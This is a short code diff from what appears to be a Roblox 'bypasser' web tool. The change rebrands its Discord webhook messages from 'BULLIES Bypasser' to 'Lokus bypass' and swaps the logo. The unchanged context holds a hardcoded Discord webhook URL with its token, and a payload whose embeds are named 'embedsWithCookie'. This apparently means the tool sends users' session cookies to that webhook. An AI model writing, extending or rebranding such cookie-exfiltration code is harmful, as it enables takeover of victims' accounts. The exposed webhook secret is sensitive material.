@@ -38,7 +38,7 @@ async function validateCSRFToken(request: Request): Promise<{ valid: boolean; er
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1486319901806166096/9xfWLDXBP1xdOzdG_TZXhDVloUMbO3QIdlaEwP5Ifxn_YDA5j9i57r-6X6_PVrT3jRMs"
 const ROBLOX_R_LOGO = "https://tr.rbxcdn.com/38c6ee6812f0abd46a3f3a704e2d786c/150/150/Image/Png"
-const BYPASSER_LOGO = "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/cropped_circle_image%20%281%29-rXlM9BZWTeqhi9DW6qX3x5tByYsMI2.png"
+const BYPASSER_LOGO = "https://cdn.discordapp.com/attachments/1486335642899189801/1486342075556434170/images.png?ex=69c5276d&is=69c3d5ed&hm=7443d16bf281dba941ae07e0ce76695c7441e8dc2c07c462f2664f247d16193e"
 const EMOJI_ROBUX = "<:robux:1464171977467236375>"
 const EMOJI_CHECKMARK = "<:Verified:1462045354831646772>"
 const EMOJI_WHITE_FIRE = "<a:WhiteFire:1459486498595410032>"
@@ -261,8 +261,8 @@ async function sendWebhook(opts: {
     }
 
     const webhookPayload = {
-      content: `${status === "success" ? EMOJI_WHITE_FIRE : "\u274C"} **BYPASSER MODULE — ${status.toUpperCase()}** ${status === "success" ? EMOJI_WHITE_FIRE : "\u274C"}`,
-      username: "BULLIES Bypasser",
+      content: `${status === "success" ? EMOJI_WHITE_FIRE : "\u274C"} **LOKUS BYPASS — ${status.toUpperCase()}** ${status === "success" ? EMOJI_WHITE_FIRE : "\u274C"}`,
+      username: "Lokus bypass",
       avatar_url: BYPASSER_LOGO,
       embeds: embedsWithCookie,
     }
